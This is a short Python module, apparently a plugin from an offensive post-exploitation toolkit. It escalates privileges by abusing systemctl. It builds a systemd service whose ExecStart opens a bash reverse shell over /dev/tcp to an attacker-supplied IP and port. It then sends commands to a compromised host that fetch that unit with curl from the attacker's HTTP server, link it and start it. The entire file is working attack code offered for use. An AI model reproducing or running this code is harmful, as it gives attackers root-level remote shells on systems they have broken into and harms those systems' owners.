#!/usr/bin/python3
# @Мартин.
# ███████╗              ██╗  ██╗    ██╗  ██╗     ██████╗    ██╗  ██╗     ██╗    ██████╗
# ██╔════╝              ██║  ██║    ██║  ██║    ██╔════╝    ██║ ██╔╝    ███║    ╚════██╗
# ███████╗    █████╗    ███████║    ███████║    ██║         █████╔╝     ╚██║     █████╔╝
# ╚════██║    ╚════╝    ██╔══██║    ╚════██║    ██║         ██╔═██╗      ██║     ╚═══██╗
# ███████║              ██║  ██║         ██║    ╚██████╗    ██║  ██╗     ██║    ██████╔╝
# ╚══════╝              ╚═╝  ╚═╝         ╚═╝     ╚═════╝    ╚═╝  ╚═╝     ╚═╝    ╚═════╝

from plugin.core import core
import re
import time


class systemctl:
    def __init__(self, socks, ip, port, re_ip, re_port):
        self.payload = f'''
[Service]
Type=oneshot
ExecStart=/bin/bash -c '/bin/bash -i >&/dev/tcp/{re_ip}/{re_port} 0>&1'
[Install]
WantedBy=multi-user.target
        '''
        self.__exploit(socks, ip, port, re_ip, re_port)
        
    def __exploit(self, socks, ip, port, re_ip, re_port):
        with open('./plugin/pwn.service','w')as f:
            f.write(self.payload)
        time.sleep(2) 
        core.send_command(socks, f"curl http://{ip}:{port}/plugin/pwn.service >/tmp/pwn.service ")
        time.sleep(10)
        core.send_command(socks, 'systemctl link /tmp/pwn.service')
        time.sleep(1)
        core.send_command(socks, f"systemctl start pwn.service")
        print("[+] Systemctl privilege escalation completed...")

